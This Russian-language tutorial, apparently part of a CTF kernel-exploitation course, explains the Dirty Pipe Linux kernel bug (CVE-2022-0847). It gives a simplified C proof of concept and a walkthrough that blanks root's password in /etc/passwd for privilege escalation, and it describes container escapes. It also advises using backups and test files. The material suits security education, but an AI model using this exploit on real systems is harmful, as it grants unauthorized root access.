Dirty Pipe (CVE-2022-0847) — редкий пример логической уязвимости ядра, дающей мощный примитив без манипуляций с кучей. Из-за неинициализированного поля флагов в `pipe_buffer` атакующий может записать произвольные данные в **read-only** файл (даже если он открыт только для чтения), обойдя проверки прав. Это позволяет править `/etc/passwd`, `authorized_keys`, setuid-бинари и в некоторых конфигурациях выходить из контейнера.

В этом уроке — механика `pipe_buffer`, условия эксплуатации и полный PoC. Материал продолжает `pwn-kernel-cross-cache`.

## Что такое Dirty Pipe

Ядро кэширует содержимое файлов в page cache. Когда вы пишете в pipe, данные попадают в `pipe_buffer`, которые ссылаются на страницы. Уязвимость в том, что флаг `PIPE_BUF_FLAG_CAN_MERGE` мог оставаться выставленным от предыдущих операций, потому что поле `flags` не обнулялось. Если затем «слить» новый pipe_buffer с уже существующим (через splice из файла), ядро считает, что можно дописывать данные в ту же страницу — и пишет в page cache файла, минуя проверки прав на запись.

Ключевое: файл может быть открыт **только для чтения** (`O_RDONLY`), но page cache всё равно изменяется, потому что проверка прав происходит при `open`, а не при записи в кэш.

## Механика pipe_buffer и флагов

| Поле | Назначение |
|---|---|
| page | страница page cache |
| offset | смещение в странице |
| len | длина данных |
| flags | флаги (CAN_MERGE и др.) |
| ops | операции pipe |

`PIPE_BUF_FLAG_CAN_MERGE` означает «можно дописывать в этот буфер». Уязвимость: флаг не сбрасывался при переиспользовании `pipe_buffer`, поэтому splice из файла создавал буфер, в который можно было дописывать — даже если страница принадлежит read-only файлу.

## Условия эксплуатации

- Ядро **5.8 ≤ версия < 5.16.11 / 5.15.25 / 5.10.102** (исправлено в начале 2022).
- Доступ к pipe и splice (обычно есть у любого пользователя).
- Целевой файл должен быть доступен для **чтения** (не для записи).
- Нельзя писать в первый байт страницы (ограничение offset > 0) и нельзя пересекать границу страницы.

## Разобранный пример: запись в /etc/passwd

Классический PoC: перезаписать запись `root` в `/etc/passwd`, убрав пароль, или добавить нового пользователя с UID 0. Простейший вариант — перезаписать пароль root на пустой:

```c
// 1. открываем файл ТОЛЬКО для чтения
int fd = open("/etc/passwd", O_RDONLY);

// 2. находим смещение строки "root:x:" и записываем туда данные
// (через pipe + splice, используя баг)
loff_t offset = find_offset(fd, "root:");
write_to_file(fd, offset, "root::", 6);   // убираем "x"
```

После этого `su root` пускает без пароля (в уязвимых конфигурациях).

## Полный PoC

Упрощённый PoC (ядро уязвимо):

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

void dirty_write(int fd, loff_t offset, const char *data, size_t len) {
    int p[2];
    pipe(p);

    // заполняем pipe, чтобы выставить CAN_MERGE в буферах
    unsigned int pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    char *buf = malloc(pipe_size);
    memset(buf, 'A', pipe_size);
    for (unsigned int i = 0; i < pipe_size; i += 4096)
        write(p[1], buf, 4096);
    for (unsigned int i = 0; i < pipe_size; i += 4096)
        read(p[0], buf, 4096);

    // splice из файла: создаёт pipe_buffer с CAN_MERGE
    loff_t off = offset - 1;
    splice(fd, &off, p[1], NULL, 1, 0);

    // запись в read-only файл (page cache)
    write(p[1], data, len);
}
```

Запуск:

```bash
gcc -o dirty dirty.c
./dirty
su root    # пароль больше не требуется
```

Ожидаемый результат:

```
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Контейнерный escape

В контейнерах Dirty Pipe особенно опасен: можно изменить файлы **хостовой** файловой системы, если они видны в контейнер (например, `/proc/self/root` или смонтированные тома). Классический сценарий — перезапись `/usr/bin/su` или `authorized_keys` хоста, после чего выход из контейнера становится тривиальным. Это делает Dirty Pipe популярным в CTF-задачах на container escape.

Исправление — обнуление `flags` при переиспользовании `pipe_buffer`.

## Подробности page cache и splice

Page cache — это кэш страниц файлов в памяти. Когда вы читаете файл, ядро подгружает страницы в page cache и отдаёт их. Когда пишете — изменения идут в page cache и позже сбрасываются на диск. Обычно запись в page cache возможна только через дескриптор, открытый на запись, и только после проверки прав.

`splice` переносит данные между дескрипторами без копирования в userspace, работая с `pipe_buffer`, которые ссылаются на страницы page cache. Именно через `splice` из файла в pipe создаётся `pipe_buffer`, указывающий на страницу файла. Если его флаги содержат `PIPE_BUF_FLAG_CAN_MERGE`, последующая `write` в pipe «допишет» данные прямо в страницу page cache — и файл изменится, хотя дескриптор был `O_RDONLY`. Это и есть суть CVE-2022-0847.

## Практика: аккуратный PoC

Dirty Pipe деструктивен: он реально меняет файлы. В CTF и на пентесте соблюдайте осторожность:

- **Делайте бэкап** целевого файла (или работайте на копии образа).
- **Не трогайте первый байт страницы** — ограничение offset > 0.
- **Не пересекайте границу страницы** — запись не должна выходить за 4096.
- **Выбирайте безобидную цель** для демонстрации (например, собственный файл в `/tmp`).
- **Восстанавливайте** изменённый файл после проверки.

Для проверки уязвимости достаточно записать один байт в тестовый файл и убедиться, что содержимое изменилось, хотя файл открывался только на чтение. Это безопаснее, чем сразу править `/etc/passwd`.

## Почему Dirty Pipe так популярен в CTF

Dirty Pipe сочетает три привлекательных свойства: **простота** (не нужен heap-grooming или ROP), **надёжность** (срабатывает почти всегда) и **мощность** (запись в произвольный читаемый файл, включая read-only). Для CTF это идеальный вектор: ядро в диапазоне уязвимых версий, а дальше — пара десятков строк C. Особенно часто задача строится на container escape: перезаписать `authorized_keys` или setuid-бинарь хоста и «выйти» из контейнера.

Ещё одна причина популярности — уязвимость «логическая», а не memory-corruption. Она не требует обхода ASLR/KASLR, потому что не меняет поток управления. Это понижает порог входа и делает технику доступной даже тем, кто не глубоко знает kernel-эксплуатацию. В реальном мире Dirty Pipe активно использовали для локального повышения привилегий и в атаках на контейнеры.

## Практика: минимальный безопасный PoC

Для проверки уязвимости достаточно изменить один байт в тестовом файле. Создайте файл, откройте его `O_RDONLY`, найдите смещение > 0 (например, второй байт), примените технику и прочитайте файл заново. Если байт изменился, хотя дескриптор был только на чтение, — уязвимость подтверждена. Это безопаснее, чем править системные файлы.

Если нужно продемонстрировать LPE, аккуратно сделайте бэкап `/etc/passwd` и восстановите его после. На реальных системах лучше вообще не трогать системные файлы без явного разрешения: Dirty Pipe может нарушить работу системы, если записать мусор в критичный файл. Всегда фиксируйте исходное содержимое файла перед изменением и проверяйте, что восстановление прошло успешно. В идеале проводите демонстрацию на одноразовой ВМ или контейнере, который можно пересоздать.

## Итог и что запомнить

Dirty Pipe (CVE-2022-0847) — логическая уязвимость ядра: неинициализированный флаг `PIPE_BUF_FLAG_CAN_MERGE` в `pipe_buffer` позволяет писать в page cache read-only файла. Запомните диапазон уязвимых версий (5.8–5.16.10), ограничения (offset > 0, не через границу страницы) и то, что техника не требует обхода control-flow защит. Это делает её идеальной для CTF и container escape.

## Частые ошибки

- **Писать в первый байт страницы.** Offset должен быть > 0.
- **Пересекать границу страницы.** Запись не должна выходить за 4096.
- **Писать в файл, который нельзя прочитать.** Нужен доступ на чтение.
- **Не то ядро.** Проверяйте версию.
- **Портить важный файл.** Делайте бэкап и аккуратно восстанавливайте.
